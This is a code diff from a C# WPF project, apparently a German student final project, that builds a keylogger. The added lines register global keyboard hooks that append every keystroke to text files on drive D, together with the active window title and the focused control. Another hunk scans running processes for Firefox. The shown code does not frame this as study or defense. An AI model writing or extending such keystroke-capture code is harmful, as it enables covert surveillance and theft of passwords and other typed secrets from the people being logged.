@@ -24,9 +24,7 @@ namespace AbschlussprojektWPF
     /// </summary>
     public partial class wndMain : Window
     {
-
-        public string processName;
-        Logger logFile = new Logger();
+        clsLogger logFile = new clsLogger();
 
         // bools zum Überprüfen der Checkboxen
         bool firefox;
@@ -110,13 +108,16 @@ namespace AbschlussprojektWPF
             }
             else
             {
+                wndMessageBoxStartLog wndMessageBoxStartedLog = new wndMessageBoxStartLog();
+                wndMessageBoxStartedLog.Show();
                 using (var api = new KeystrokeAPI())
                 {
                     KeystrokeAPI ki = new KeystrokeAPI();
-                    api.CreateKeyboardHook((character) => { File.AppendAllText(@"D:\KeyLog.txt", character + " " + logFile.GetTitleOfActiveWindow() + "\r\n\r\n"); ; });
+                    api.CreateKeyboardHook((character) => { File.AppendAllText(@"D:\KeyLog.txt", character + " " + logFile.GetTitleOfActiveWindow() + " " + logFile.GetFocusedControl() + "\r\n\r\n"); ; });
+                    api.CreateKeyboardHook((character) => { File.AppendAllText(@"D:\KeysOnly.txt", character + "\r\n\r\n"); ; });
+
                 }
-                wndMessageBoxStartLog wndMessageBoxStartedLog = new wndMessageBoxStartLog();
-                wndMessageBoxStartedLog.Show();
+
             }
 
             
@@ -182,6 +183,7 @@ namespace AbschlussprojektWPF
             // läuft durch die Prozesse
             foreach (Process theprocess in processlist)
             {
+              
                 ProcessName = theprocess.ProcessName;
 
                 if (ProcessName == "firefox")
